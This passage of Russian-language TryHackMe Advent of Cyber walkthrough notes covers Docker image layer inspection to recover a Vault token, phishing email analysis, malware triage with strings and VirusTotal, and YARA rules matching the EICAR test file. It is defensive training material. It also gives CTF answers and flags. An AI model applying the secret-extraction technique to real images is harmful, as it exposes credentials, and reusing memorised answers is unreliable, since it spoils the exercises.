9dedacd92213db743681db2e8d5b3247fd79ce266495d061a381c4c0441ce15d/VERSION
9dedacd92213db743681db2e8d5b3247fd79ce266495d061a381c4c0441ce15d/json
9dedacd92213db743681db2e8d5b3247fd79ce266495d061a381c4c0441ce15d/layer.tar
a3c1e603ab4385e0b411423e70314651bb371561c45a2bc90951fa05da9ad3c4/
a3c1e603ab4385e0b411423e70314651bb371561c45a2bc90951fa05da9ad3c4/VERSION
a3c1e603ab4385e0b411423e70314651bb371561c45a2bc90951fa05da9ad3c4/json
a3c1e603ab4385e0b411423e70314651bb371561c45a2bc90951fa05da9ad3c4/layer.tar
aa7f7d1cdeacc3a446e297814a6c13a42006dc8a99baad72c0c50383d69ac551/
aa7f7d1cdeacc3a446e297814a6c13a42006dc8a99baad72c0c50383d69ac551/VERSION
aa7f7d1cdeacc3a446e297814a6c13a42006dc8a99baad72c0c50383d69ac551/json
aa7f7d1cdeacc3a446e297814a6c13a42006dc8a99baad72c0c50383d69ac551/layer.tar
f886f00520700e2ddd74a14856fcc07a360c819b4cea8cee8be83d4de01e9787.json
fa28cd504eaba5e76b168c5149551371fbeb3bc0f51d18485fe401a411c2dd17/
fa28cd504eaba5e76b168c5149551371fbeb3bc0f51d18485fe401a411c2dd17/VERSION
fa28cd504eaba5e76b168c5149551371fbeb3bc0f51d18485fe401a411c2dd17/json
fa28cd504eaba5e76b168c5149551371fbeb3bc0f51d18485fe401a411c2dd17/layer.tar
manifest.json
repositories
root@ip-10-10-20-249:~/aoc#
```
Эти файлы представляют различные слои образа контейнера, за исключением файла manifest.json. manifest.json 
представляет собой "манифест" слоев образа контейнера, которые составляют окончательный образ контейнера, в котором 
мы только что были. Давайте посмотрим на это изображение, используя инструмент под названием "jq", чтобы "красиво 
распечатать" вывод для более удобного чтения:   

Note: On an attack box, jq is now pre-installed and you can skip this step

1. Установите jq:`apt install jq -y`
2. Выведите содержимое manifest.json на терминал, используя jq для удобной печати:cat manifest.json | jq

манифест кошки.json
```commandline
root@ip-10-10-20-249:~/aoc# cat manifest.json | jq
[
  {
    "Config": "f886f00520700e2ddd74a14856fcc07a360c819b4cea8cee8be83d4de01e9787.json",
    "RepoTags": [
      "public.ecr.aws/h0w1j9u3/grinch-aoc:latest"
    ],
    "Layers": [
      "a3c1e603ab4385e0b411423e70314651bb371561c45a2bc90951fa05da9ad3c4/layer.tar",
      "619ddb982b75f0eb6c9f48624e6a0d20be227e893599d8dea05dbdddc8b14e2b/layer.tar",
      "40ad0e404f6065a153d1b4d42e8b315be3504a08c21fadd6e5fde5982b45df18/layer.tar",
      "aa7f7d1cdeacc3a446e297814a6c13a42006dc8a99baad72c0c50383d69ac551/layer.tar",
      "4f62ae56d8d3b96d5fbe86da8a3f7bf6e9195d360b922cd7b162e17619c50664/layer.tar",
      "9dedacd92213db743681db2e8d5b3247fd79ce266495d061a381c4c0441ce15d/layer.tar",
      "fa28cd504eaba5e76b168c5149551371fbeb3bc0f51d18485fe401a411c2dd17/layer.tar",
      "4416e55edf1a706527e19102949972f4a8d89bbe2a45f917565ee9f3b08b7682/layer.tar",
      "4cc7bdb0ea56d31f57a373d0e7ce0d633ae86dc327087fccf103c8d97f0cc9c4/layer.tar"
    ]
  }
]
root@ip-10-10-20-249:~/aoc#
Обратите внимание, что первая часть информации в файле — «Config», которая представляет собой базовые конфигурации и команды, используемые для создания образа контейнера.

f886f00520700e2ddd74a14856fcc07a36c819b4cea8cee8be83d4de01e9787.json
Этот файл конфигурации также находится в корневом каталоге распакованного образа контейнера:

лс
root@ip-10-10-20-249:~/aoc# ls
40ad0e404f6065a153d1b4d42e8b315be3504a08c21fadd6e5fde5982b45df18
4416e55edf1a706527e19102949972f4a8d89bbe2a45f917565ee9f3b08b7682
4cc7bdb0ea56d31f57a373d0e7ce0d633ae86dc327087fccf103c8d97f0cc9c4
4f62ae56d8d3b96d5fbe86da8a3f7bf6e9195d360b922cd7b162e17619c50664
619ddb982b75f0eb6c9f48624e6a0d20be227e893599d8dea05dbdddc8b14e2b
9dedacd92213db743681db2e8d5b3247fd79ce266495d061a381c4c0441ce15d
a3c1e603ab4385e0b411423e70314651bb371561c45a2bc90951fa05da9ad3c4
aa7f7d1cdeacc3a446e297814a6c13a42006dc8a99baad72c0c50383d69ac551
aoc.tar
f886f00520700e2ddd74a14856fcc07a360c819b4cea8cee8be83d4de01e9787.json
fa28cd504eaba5e76b168c5149551371fbeb3bc0f51d18485fe401a411c2dd17
manifest.json
repositories
root@ip-10-10-20-249:~/aoc#
и может быть проверен таким же образом, как manifest.json:

cat f886f00520700e2ddd74a14856fcc07a36c819b4cea8cee8be83d4de01e9787.json | jq

cat .json Конфигурация часть 1
root@ip-10-10-20-249:~/aoc# cat f886f00520700e2ddd74a14856fcc07a360c819b4cea8cee8be83d4de01e9787.json | jq
{
  "architecture": "amd64",
  "config": {
    "Hostname": "",
    "Domainname": "",
    "User": "newuser",
    "AttachStdin": false,
    "AttachStdout": false,
    "AttachStderr": false,
    "Tty": false,
    "OpenStdin": false,
    "StdinOnce": false,
    "Env": [
      "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
      "api_key=a90eac086fd049ab9a08374f65d1e977"
    ],
    "Cmd": null,
    "Image": "sha256:035522c2043f6036e879810cfffe0db9665ebb09e1852339231fd805daad5325",
    "Volumes": null,
    "WorkingDir": "/home/newuser",
    "Entrypoint": [
      "sh"
    ],
    "OnBuild": null,
    "Labels": null
  },
  "container": "7b422a5dd0a2a59167ae476fcc18f7ae9a094c02de40b4b4effd42a5d032bae4",
  "container_config": {
    "Hostname": "7b422a5dd0a2",
    "Domainname": "",
    "User": "newuser",
    "AttachStdin": false,
```
Первый раздел файла конфигурации манифеста проходит через окончательную конфигурацию образа, как предполагается для 
запуска на хост-системе контейнера. Однако следующий раздел представляет особый интерес для злоумышленника — вот как 
был создан образ контейнера. Вы можете видеть, что каждый раздел разделен фигурными скобками, а некоторые разделы 
имеют дополнительную строку, указывающую "empty_layer": true.

Конфигурация cat .json часть 2
```commandline
"created": "2021-10-21T20:31:17.236366166Z",
"docker_version": "20.10.7",
"history": [
  {
    "created": "2021-10-16T00:37:47.226745473Z",
    "created_by": "/bin/sh -c #(nop) ADD file:5d68d27cc15a80653c93d3a0b262a28112d47a46326ff5fc2dfbf7fa3b9a0ce8 in / "
  },
  {
    "created": "2021-10-16T00:37:47.578710012Z",
    "created_by": "/bin/sh -c #(nop)  CMD [\"bash\"]",
    "empty_layer": true
  },
  {
    "created": "2021-10-20T16:16:12.499990187Z",
    "created_by": "/bin/sh -c apt-get upgrade && apt-get update"
  },
  {
    "created": "2021-10-20T16:16:46.080121757Z",
    "created_by": "/bin/sh -c apt install curl -y"
  },
  {
    "created": "2021-10-21T20:22:41.837170259Z",
    "created_by": "/bin/sh -c apt install python3 -y"
  },
  {
    "created": "2021-10-21T20:23:42.130217528Z",
    "created_by": "/bin/sh -c apt install pip -y"
  },
  {
    "created": "2021-10-21T20:23:52.8316757Z",
    "created_by": "/bin/sh -c apt install git -y"
  },
  {
    "created": "2021-10-21T20:31:13.639594181Z",
    "created_by": "/bin/sh -c git clone https://github.com/hashicorp/envconsul.git root/envconsul/"
  },
  {
    "created": "2021-10-21T20:31:14.315738313Z",
    "created_by": "/bin/sh -c #(nop) WORKDIR /root/envconsul",
    "empty_layer": true
  },
  {
    "created": "2021-10-21T20:31:14.645450256Z",
    "created_by": "/bin/sh -c #(nop) ADD file:cba528c0d7ba7c0c89ad4ce3e550dc4b3128c2804d4dc75daaf1421759f6d664 in . "
  },
  {
    "created": "2021-10-21T20:31:15.914695012Z",
```
Каждый из этих разделов описывает определенную команду, запущенную демоном Docker во время создания образа, и если 
конфигурация "empty_layer": trueне указана как часть определения раздела, то слой контейнера сохраняется в общем 
образе контейнера как один из слоев, перечисленных в файле manifest.json. Особый интерес — мы замечаем, что 
контейнеры контейнеров — это инструмент, envconsulкоторый извлекается из Github. Просматривая репозиторий Github для 
envconsul — в описании about указано, что envconsul — это инструмент, который позволяет пользователю «запустить 
подпроцесс с переменными среды, используя данные из @hashicorp Consul и Vault». Отмечая, что этот исходный код был 
клонирован в корневой каталог — возможно, есть что-то конфиденциальное, связанное с envconsul, что обычный 
пользователь контейнера не должен видеть в Grinch Enterprises. Давайте разберемся в слоях образа и посмотрим, сможем 
ли мы выяснить, что же такого конфиденциального в envconsul.

Мы можем более внимательно изучить слои, переключившись на подкаталоги, представляющие слои в распакованном корневом 
каталоге контейнера. Переключаясь между этими слоями, мы замечаем один слой, представляющий особый интерес: 
```commandline
catconfig.hcl
root@ip-10-10-20-249:~/aoc# cd 4416e55edf1a706527e19102949972f4a8d89bbe2a45f917565ee9f3b08b7682/
root@ip-10-10-20-249:~/aoc/4416e55edf1a706527e19102949972f4a8d89bbe2a45f917565ee9f3b08b7682# tar -xvf layer.tar
root/
root/envconsul/
root/envconsul/config.hcl
root@ip-10-10-20-249:~/aoc/4416e55edf1a706527e19102949972f4a8d89bbe2a45f917565ee9f3b08b7682# cat root/envconsul/config.hcl
# This denotes the start of the configuration section for Consul. All values
# contained in this section pertain to Consul.
consul {

  # This is the address of the Consul agent. By default, this is
  # 127.0.0.1:8500, which is the default bind and port for a local Consul
  # agent. It is not recommended that you communicate directly with a Consul
  # server, and instead communicate with the local Consul agent. There are many
  # reasons for this, most importantly the Consul agent is able to multiplex
  # connections to the Consul server and reduce the number of open HTTP
  # connections. Additionally, it provides a "well-known" IP address for which
  # clients can connect.
  address = "127.0.0.1:8500"

  # This controls the retry behavior when an error is returned from Consul.
  # Envconsul is highly fault tolerant, meaning it does not exit in the face
  # of failure. Instead, it uses exponential back-off and retry functions
  # to wait for the cluster to become available, as is customary in distributed
```

Спойлер
Этот слой содержит файл config.hcl — если посмотреть на этот файл в слое образа контейнера, то станет ясно, что в 
файле хранятся конфиденциальные конфигурации. Давайте воспользуемся инструментом командной строки Linuxgrep и 
посмотрим, сможем ли мы вернуть «секрет» или «токен»… и вот он на строке 4 при поиске строки «токен». Интересно, 
знали ли разработчики Grinch Enterprise, что образ контейнера кэширует все слои контейнера? В любом случае, теперь 
мы можем поменяться ролями с Grinch Enterprises и получить доступ к их кластеру Vault со всеми его секретами!    

токен grep
```commandline
root@ip-10-10-20-249:~/aoc/4416e55edf1a706527e19102949972f4a8d89bbe2a45f917565ee9f3b08b7682# cat root/envconsul/config.hcl | grep 'token'
# This is the token to use when communicating with the Vault server.
# assumption that you provide it with a Vault token; it does not have the
# incorporated logic to generate tokens via Vault's auth methods.
token = "TOKEN"
# This tells Envconsul to load the Vault token from the contents of a file.
# - by default Envconsul will not try to renew the Vault token, if you want it
# to renew you will need to specify renew_token = true as below.
# - Envconsul will periodically stat the file and update the token if it has
# vault_agent_token_file = "/path/to/vault/agent/token/file"
# This tells Envconsul that the provided token is actually a wrapped
# token that should be unwrapped using Vault's cubbyhole response wrapping
unwrap_token = true
# This option tells Envconsul to automatically renew the Vault token given.
# If you are unfamiliar with Vault's architecture, Vault requires tokens be
# automatically renew the token at half the lease duration of the token. The
# you want to renew the Vault token using an out-of-band process.
# There is an exception to the default such that if vault_agent_token_file is
# set, either from the command line or the above option, renew_token defaults
# token itself.
renew_token = true
root@ip-10-10-20-249:~/aoc/4416e55edf1a706527e19102949972f4a8d89bbe2a45f917565ee9f3b08b7682#
```
### Ответить на вопросы ниже
Какая команда выведет список образов контейнеров, хранящихся в локальном реестре контейнеров?

```commandline
docker images
```
Какая команда позволит сохранить образ Docker как архив tar?
```commandline
docker save
```
Каково имя файла (включая расширение файла) для конфигурации, тегов репозитория и хэш-значений слоев, хранящихся в 
образе контейнера? 
```commandline
manifest.json
```
Какую ценность токена вы нашли для бонусного задания?
```commandline
7095b3e9300542edadbc2dd558ac11fa
```

## Задание 24
Разверните виртуальную машину, прикрепленную к этой задаче; она будет видна в режиме разделенного экрана, как только 
будет готова.  

Если вы не видите загрузку виртуальной машины, нажмите  кнопку «Показать разделенный вид». 

Макскиди получил сообщения о многочисленных попытках фишинга от разных эльфов. 

Один из эльфов поделился отправленным ей письмом вместе с вложением. Письмо было переслано как файл .eml вместе со 
строкой в кодировке base64 в текстовом файле. Grinch Enterprises затевает свои махинации?   

Посмотрите видеообзор CyberSecMeg на 19-й день  здесь

Злоумышленники используют технику, известную как фишинг, чтобы попытаться проникнуть в целевую организацию и 
закрепиться в ней (первичный доступ).   

Определение фишинга согласно MITRE ATT&CK Framework: «Злоумышленники могут отправлять фишинговые сообщения, чтобы 
получить доступ к системам жертвы. Все формы фишинга представляют собой электронную социальную инженерию. Фишинг 
может быть целевым, известным как целевой фишинг. При целевом фишинге целью злоумышленника будет конкретное лицо, 
компания или отрасль. В более общем смысле злоумышленники могут проводить нецелевой фишинг, например, в ходе 
массовых спам-кампаний с использованием вредоносного ПО.     

Злоумышленники могут отправлять жертвам электронные письма, содержащие вредоносные вложения или ссылки, как правило, 
для выполнения вредоносного кода на системах жертв. Фишинг также может осуществляться через сторонние сервисы, такие 
как платформы социальных сетей. Фишинг также может включать методы социальной инженерии, такие как выдача себя за 
доверенный источник.    

Ссылка -  https://attack.mitre.org/techniques/T1566/

Поскольку этот тип атак в равной степени нацелен на сотрудников как малых, так и крупных организаций, часто 
проводится обязательное обучение по вопросам безопасности, чтобы помочь свести к минимуму вероятность того, что 
получатель станет жертвой этого типа атак.  

Есть несколько признаков, на которые следует обращать внимание в электронных письмах, не проводя при этом обширного 
анализа, чтобы определить, является ли электронное письмо потенциальной попыткой фишинга.  Ниже приведены некоторые 
примеры:  
- Знаете ли вы отправителя? Соответствует ли адрес электронной почты отправителю? Соответствует ли ответный адрес 
  электронной почты отправителю? 
- Приветствует ли вас в тексте письма лично (Привет, МакСкиди) или носит общий характер (Привет, Эльф)?
- Содержит ли электронное письмо грамматические ошибки, например, неправильно написанные слова?
- Дает ли вам электронное письмо ощущение срочности, когда вам нужно действовать быстро? Например, крайний срок, 
  чтобы предотвратить отключение вашего аккаунта. 
- Содержит ли электронное письмо ссылку или нажимаемую кнопку, которая перенаправляет вас на веб-сайт? Соответствует 
  ли ссылка отправителю или это случайный веб-сайт? 
- Есть ли вложение к электронному письму? 

Теперь вы готовы приступить к работе. Откройте почтовое приложение на подключенной виртуальной машине. 
`Email.eml` автоматически откроется для вас. Я просматриваю содержимое файла email.eml и отвечаю на вопросы ниже.    
При просмотре исходного кода электронной почты вы обычно увидите закодированные строки в Base64 (математический 
расчет, выполняемый над символами для их кодирования в обратимый формат). Смотрите пример ниже. 
Чтобы просмотреть исходный код письма, воспользуйтесь примером ниже.
Ниже приведены команды, которые помогут вам проанализировать закодированный текстовый файл вложения.

- Для чтения содержимого текстовых файлов  можно использовать командную строку Linux.

Прочитайте файл вложения.txt
`mcskidy@elfmode$ cat attachment.txt`
- Чтобы декодировать строку, закодированную Base64,  в командной строке Linux , можно использовать следующую команду:

Расшифруйте строку в файле attachment-base64-only.txt
`mcskidy@elfmode$ cat attachment-base64-only.txt | base64 -d`
- Чтобы преобразовать строку, закодированную в Base64, в исходный формат файла, можно использовать следующую команду:

Расшифруйте закодированную строку и сохраните как PDF-файл.
`mcskidy@elfmode$ cat attachment-base64-only.txt | base64 -d > file.pdf`
Вы знаете, что файл является PDF-файлом, основываясь на  волшебном заголовке . Смотрите ниже.

Что такое магические заголовки?  Для получения дополнительной информации обратитесь к этой ссылке в Википедии.

Примечание: Вы можете попробовать преобразовать Base64 в настоящий PDF-файл с помощью CyberChef.

P.S. Не волнуйтесь, если вы еще не знакомы с CyberChef, мы познакомим вас с ним в ближайшие дни. ;)

### Ответить на вопросы ниже
Кому было отправлено электронное письмо? (Ответ: адрес электронной почты)
```commandline
elfmcphearson@tbfc.com
```
Фишинговые письма используют похожие домены своих целей, чтобы увеличить вероятность того, что получатель будет 
обманут и взаимодействует с письмом. От кого, как там говорится, было письмо? (Ответ — адрес электронной почты) 
```commandline
customerservice@t8fc.info
```
Иногда фишинговые письма имеют другой адрес электронной почты для ответа. Если на это письмо был дан ответ, на какой 
адрес электронной почты будет получен ответ? 
```commandline
fisher@tempmailz.grinch
```
Менее сложные фишинговые письма будут содержать опечатки. Какое слово написано с ошибкой?
```commandline
stright
```
В письме содержится ссылка, которая перенаправит получателя на мошеннический веб-сайт с целью сбора учетных данных. 
Что такое ссылка на веб-сайт сбора учетных данных? 
```commandline
https://89xgwsnmo5.grinch/out/fishing/
```
Просмотреть исходный код письма. Необычный заголовок письма. Что такое заголовок и его значение?
```commandline
X-GrinchPhish: >;^)
```
Вы получили другие сообщения о попытках фишинга от других коллег. Некоторые из других писем содержали вложения. 
Откройте вложение.txt. Каково название вложения? 
```commandline
password-reset-instructions.pdf
```
Что такое флаг в PDF-файле?
```commandline
THM{A0C_Thr33_Ph1sh1ng_An4lys!s}
```
Если вы хотите узнать больше о фишинге, ознакомьтесь с модулем «Фишинг» на TryHackMe.
```commandline
Ответ не нужен
```

## Задание 25
История:

McPayroll обрабатывает бонусы для всех трудолюбивых эльфов. Один из эльфов отправил McPayroll файл, который, как они 
утверждают, содержит их обновленную платежную информацию. Единственная проблема в том, что она не узнает эльфа — 
может ли это быть подлой атакой от Grinch Enterprises, чтобы вызвать еще больше хаоса? Проанализируйте файл, чтобы 
узнать, является ли он вредоносным или нет!   

McPayroll предоставляет этот файл McSkidy, которая является членом команды безопасности. McSkidy — мудрый эльф. Она 
знает, что этот файл нужно анализировать в изолированной среде. Поэтому она запустила свою виртуальную машину 
Remnux, чтобы взглянуть на подозрительный файл. Она распаковала архив и увидела, что в zip-архиве есть папка с 
именем «Samples» и файл с именем «testfile». Она скопировала эти файлы на свой рабочий стол Remnux, чтобы начать 
анализ.    

Посмотрите видео-обучение Сакиба на 20-й день здесь

Цели обучения:

В этом задании мы узнаем:
- Как определить тип файла независимо от расширения файла
- Как найти строки в файле
- Как рассчитать хэш файла

Использование VirusTotal для предварительного анализа подозрительного файла
Первоначальный анализ:

Чтобы начать анализ, МакСкиди запустила  file команду.  file Команда представляет собой утилиту Linux, которая 
помогает определить тип файла, независимо от расширения файла. МакСкиди понимает, что авторы вредоносных программ 
иногда используют вводящие в заблуждение расширения файлов, поэтому она проверяет тип файла в качестве первого шага.   

Для проверки типа файла используется следующий синтаксис:
```commandline
file <filename>
```
Подробнее об утилите File можно узнать, выполнив следующую команду в терминале Linux :
`file --help или man file`

Вот скриншот McSkidy, запускающего команду file для одного из файлов:

```commandline
ubuntu@ip-10-10-19-243:~/Desktop/Samples$ file exmatter                               
exmatter: PE32 executable (console) Intel 80386 Mono/.Net assembly, for MS Windows    
ubuntu@ip-10-10-19-243:~/Desktop/Samples 
```
Этот файл, похоже, является исполняемым файлом Windows. Похоже, подозрения McSkidy оправдались. Чтобы собрать больше 
информации о файле, McSkidy пробует команду  strings .  strings Команда также является утилитой Linux. Эта утилита 
извлекает и печатает последовательности печатаемых символов из заданного файла или того, что также известно как 
«строки». Знание того, какие строки присутствуют в файле, часто может предоставить интересную информацию о файле. В 
частности, для исполняемых файлов утилита strings может давать указатели на различные функции, вызываемые 
исполняемым файлом, любые IP-адреса или доменные имена, URL-адреса и т. д., которые могут помочь в дальнейшем 
анализе. Эта информация также может помочь инструментам безопасности, таким как антивирусное программное обеспечение,
помечать файлы как вредоносные, выявляя возможные вредоносные следы (или индикаторы компрометации/IOC, как их 
называют в индустрии безопасности).        

Для команды используется следующий синтаксис strings :
```commandline
strings <filename>
```
Подробнее об утилите и ее параметрах можно узнать,  strings выполнив следующую команду в терминале Linux :
`strings --help или man strings`

Вывод команды strings был немного слишком длинным для окна терминала, McSkidy сохранил вывод в файл. Это можно 
сделать, перенаправив вывод в файл: 
`strings <filename> > strings_output.txt`

Вот что  strings получилось:

Вы можете видеть, что первая строка гласит: «Эта программа не может быть запущена в режиме DOS». Это часть DOS - 
заглушки исполняемого файла Windows. Макскиди была немного смущена, когда смотрела на этот файл, так как он содержал 
много бессмыслицы. Однако она продолжала прокручивать, пока не была вознаграждена некоторыми интересными строками:  



По мере того, как МакСкиди начала обнаруживать более интересные строки, она начала понимать, каковы были намерения 
злого эльфа с вредоносным ПО. Она могла видеть ссылки на «ssh», «session», «message» и «disconnect», что намекает на 
то, что этот исполняемый файл может пытаться установить некое SSH- соединение для отправки сообщения или файла.  

Всего вирусов:

Несмотря на то, что эта функциональность могла быть использована в не вредоносной программе, McSkidy не хотел 
рисковать. Поэтому McSkidy решил загрузить файл на  VirusTotal . VirusTotal — это веб-сайт, который сканирует файлы, 
URL-адреса, IP-адреса, домены или хэш файла, который вы предоставляете, используя более 60 различных антивирусных 
программных продуктов и отображает сводку результатов их сканирования.

На главной странице McSkidy было несколько вариантов: отправить файл, URL, IP-адрес, домен или выполнить поиск с 
использованием хеша файла. McSkidy понимала, что файл может содержать конфиденциальную информацию и не должен быть 
сразу загружен в сторонний аналитический сервис, поэтому она вычислила его хеш MD5 и выполнила поиск в VirusTotal, 
используя хеш файла.    

В системе Linux программу  md5sum можно использовать для вывода MD5- хеша файла:

`md5sum <filename>`

Получив хэш MD5, МакСкиди поискала его на VirusTotal.

После нажатия Enter она увидела результаты, которые подтвердили ее подозрения. Она увидела, что файл был отмечен как 
вредоносный большинством поставщиков антивирусного программного обеспечения. Более того, она увидела классификацию, 
которую каждое антивирусное программное обеспечение дало файлу:  

На вкладке сведений она могла видеть хэши файла, историю его отправки на VirusTotal и различные свойства файла:

На вкладке «Связи» описываются связи между вредоносным ПО и различными доменами, IP-адресами и файлами, связанными с 
ним, а также их оценки VirusTotal (если доступны): 

На вкладке «Поведение» отображаются различные действия, выполняемые вредоносным ПО, на основе нескольких различных 
поведенческих механизмов обнаружения: 

Наконец, вкладка «Сообщество» содержит сообщения участников сообщества и их мнение о вредоносном ПО:


Изучив всю эту информацию, МакСкиди был уверен, что этот конкретный файл в пакете был вредоносным!

Теперь давайте войдем в систему, прикрепленную к заданию, и поможем Макскиди ответить на следующие вопросы.

Разверните машину, прикрепленную к задаче. Она будет видна в представлении с разделением экрана, когда будет готова. 
Если вы не видите машину в своем браузере, нажмите кнопку «Показать разделенный вид». 

### Ответить на вопросы ниже
Откройте терминал и перейдите к файлу на рабочем столе с именем 'testfile'. Используя команду 'strings', проверьте 
строки в файле. Команда 'strings' выводит только одну строку. Что выводит? 

```commandline
X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*
```
Проверьте тип файла 'testfile' с помощью команды 'file'. Какой тип файла?
```commandline
EICAR virus test files
```
Рассчитайте хэш файла и найдите его на VirusTotal. Когда файл был впервые обнаружен в дикой природе?
```commandline
2005-10-17 22:03:48
```
Какую классификацию Microsoft присвоила файлу на вкладке «Обнаружение» VirusTotal?
```commandline
Virus:DOS/EICAR_Test_File
```
Перейдите по этой ссылке, чтобы узнать больше об этом файле и для чего он используется. Каковы были первые два имени 
этого файла? 
```commandline
ducklin.htm or ducklin-html.htm
```
Файл содержит 68 символов в начале, известном как известная строка. Он может быть дополнен пробелами до 
ограниченного количества символов. Каково максимальное количество символов, которое может быть в файле? 
```commandline
128
```

## Задание 26
История
Grinch Enterprises в этом году были очень хитрыми — использовали несколько векторов атак (как известных, так и 
неизвестных), чтобы посеять хаос в Best Festival Company. До Рождества осталось 4 дня, а работы еще так много! 
МакБлу, единственный технический специалист, предложил использовать автоматизацию и инструменты для обнаружения 
вредоносных файлов в сети. Можете ли вы поработать с ним, чтобы удалить все вредоносные файлы из сети?

Посмотрите видео-обучение SecurityNinja на 21-й день  здесь

### Цели обучения:
В этом задании мы узнаем:
- Каковы правила Yara?
- Какова базовая структура правил Yara?
- Как написать основные правила Yara
- Как используются правила Yara
### Яра
Введение:

YARA — это многоплатформенный инструмент для сопоставления интересующих шаблонов в (вредоносных) файлах. Он был 
создан Виктором Альваресом из VirusTotal. Он используется для проведения исследований семейств вредоносных программ 
и выявления вредоносных программ с похожими шаблонами. Он может помочь в категоризации вредоносных программ в 
различных семействах вредоносных программ, а также может использоваться в качестве средства обнаружения для анализа 
вредоносных программ.

Правила Yara очень широко используются в отрасли для вышеупомянутых целей. Существуют различные репозитории правил 
Yara с открытым исходным кодом, которыми делятся разные организации и люди, и которые могут быть использованы 
сообществом безопасности в борьбе с вредоносным ПО.  Этот репозиторий GitHub содержит ссылки на множество таких 
репозиториев с открытым исходным кодом.

Синтаксис:

Базовый синтаксис правила Yara выглядит следующим образом:
```commandline
rule rulename
  {
    meta:
      author = "tryhackme"
      description = "test rule"
      created = "11/12/2021 00:00"
    strings:
      $textstring = "text"
      $hexstring = {4D 5A}
    conditions:
      $textstring and $hexstring
  }
```

Мы видим, что правило начинается со слова,  rule за которым следует имя правила. Это указывает на начало правила. 
Ниже мы обсудим различные разделы правила. Среди них раздел метаданных (использует ключевое слово  meta ), как 
обсуждается в конце, поскольку это необязательный раздел.  

Струны:

Как следует из названия, этот раздел посвящен строкам, которые вы хотите сопоставить в правиле Yara. В этом разделе 
мы определяем строки так, как если бы мы определяли переменные. Объявление строки начинается со знака  $, за 
которым следует имя, которое мы хотим присвоить этой строке. В приведенном выше примере мы определили две строки как 
`$textstring` и `$hexstring`.

Как следует из названий строк, строки могут быть текстовыми или шестнадцатеричными. Текстовые строки — это строки, 
которые находятся в читаемой текстовой части файла, однако шестнадцатеричные строки — это необработанные 
последовательности байтов в файле. Для определения текстовых строк мы используем двойные кавычки, а для определения 
шестнадцатеричных строк мы используем фигурные скобки. Реализацию этого можно увидеть в примере правила выше. 
Текстовые строки также могут использовать регулярные выражения или regex для более сложного сопоставления с шаблоном.

Условия:

Раздел условий определяет условия, которые автор правил хочет выполнить, чтобы правило сработало для файла. Условия 
— это логические выражения, и они используют строки, определенные в разделе строк, в качестве переменных. Например, 
в приведенном выше примере мы используем оператор  and между двумя строками. Это означает, что правило сработает, 
если оно идентифицирует  4D 5A шестнадцатеричную строку в любом месте файла, а также текстовую строку  text. В этом 
правиле нет других условий. Наиболее часто используемые операторы —  and,  or и  not.  and Оператор возвращает true, 
когда все условия истинны. Оператор  or возвращает true, когда любое из условий истинно. И возвращает  not true, 
когда заданное условие ложно. В случае строк  andбудет true, когда файл содержит все строки, которые являются частью 
этого условия,  or будет true, когда файл содержит любую из строк, которые являются частью этого условия, и  not 
будет true, когда строка, упомянутая в условии, не является частью файла. Следующая таблица иллюстрирует, когда 
каждый из этих операторов будет true:

Условия могут быть гораздо сложнее тех, что мы упомянули выше, но для краткости мы не будем вдаваться в подробности 
этой задачи. 

Метаданные:

Метаданные — необязательный, но важный раздел правил. Он начинается с ключевого слова  meta. Его можно использовать 
для добавления дополнительной информации о правиле, чтобы помочь аналитику в его анализе. Как правило, он содержит 
произвольно определенные идентификаторы и их значения, которые общеизвестны. Например, в нашем примере правила выше 
мы использовали идентификаторы  author,  description, и  created. Эти идентификаторы легко понять по типу информации,
которую они предоставляют. Добавление метаданных в правила особенно важно при внесении вклада в сообщество, 
поскольку они предоставляют важную контекстную информацию и атрибуцию для правила.

Написание собственных правил:

После базового введения мы можем попробовать написать некоторые из наших собственных правил. До сих пор мы понимали, 
что правило в основном состоит из раздела определения строк и раздела условий. Раздел определения строк определит 
строки, которые мы хотим использовать в правиле, а раздел условий определит условия, которые будут применяться к 
этим строкам. Наконец, мы можем добавить любую дополнительную информацию в раздел метаданных.   

Чтобы начать писать правило, запустите машину, прикрепленную к задаче. После запуска машины нажмите на логотип 
tryhackme в верхнем левом углу. В строке поиска напишите scite и выберите соответствующий значок, чтобы открыть 
текстовый редактор SciTE. Вы также можете открыть любой другой текстовый редактор по вашему выбору.



Теперь, используя знания, полученные в ходе выполнения этой задачи, давайте начнем писать правило. Мы напишем 
правило, которое соответствует некоторым строкам из тестового файла антивируса EICAR, о котором мы узнали в ходе 
выполнения задачи анализа вредоносных программ. Этот файл находится на рабочем столе на машине с именем  testfile. 
На следующем снимке экрана показано наше демонстрационное правило для обнаружения нескольких строк, найденных в 
тестовом файле EICAR.    

```commandline
rule eicaryara   {
    meta:
      author="tryhackme"
      description="eicar string"
    strings:
      $a="X5O"
      $b="EICAR"
      $c="ANTIVIRUS"
      $d="TEST"
    condition:
      $a and $b and $c and $d
  }
```
Далее мы сохраняем этот файл и даем ему имя по нашему выбору. Мы сохранили этот файл на рабочем столе для более 
легкого доступа при запуске правила Yara на нашем тестовом файле. 

### Выполнение правил Yara:

Теперь, когда мы написали правило, давайте узнаем, как его реализовать.

Синтаксис для запуска правила Yara можно просто сформулировать следующим образом:

`yara [options] rule_file [target]`

В нашем примере выше, наш  rule_file будет файлом, который мы сохранили как eicaryara, а  target будет нашим 
тестовым файлом. Поэтому наша команда для запуска правила будет выглядеть так: 

`yara [options] eicaryara testfile`

Указание  options здесь необязательно. Если мы запустим эту команду как есть, она вернет нам имя правила и имя файла,
если правило сработало. Если правило не сработало, она ничего не вернет. 

Если правило сработало, вывод будет выглядеть следующим образом:

Терминал
```commandline
user@TryHackMe$ yara eicaryara testfile
eicaryara testfile
user@TryHackMe$
```
Если правило не срабатывает, вывод будет выглядеть следующим образом:

Терминал
```commandline
user@TryHackMe$ yara eicaryara testfile
user@TryHackMe$
```
Мы можем использовать опцию -m для Yara, чтобы вернуть метаданные при срабатывании правила. В этом случае вывод будет выглядеть следующим образом:

Терминал
```commandline
user@TryHackMe$ yara -m eicaryara testfile
eicaryara [author="tryhackme",description="eicar string"] testfile
user@TryHackMe$
```
Аналогично, мы можем использовать опцию -s для печати строк, соответствующих файлу. Вывод в этом сценарии будет следующим:

Терминал
```commandline
user@TryHackMe$ yara -s eicaryara testfile
eicaryara testfile
0x1c:$b: EICAR
0x2b:$c: ANTIVIRUS
0x35:$d: TEST
user@TryHackMe$
```
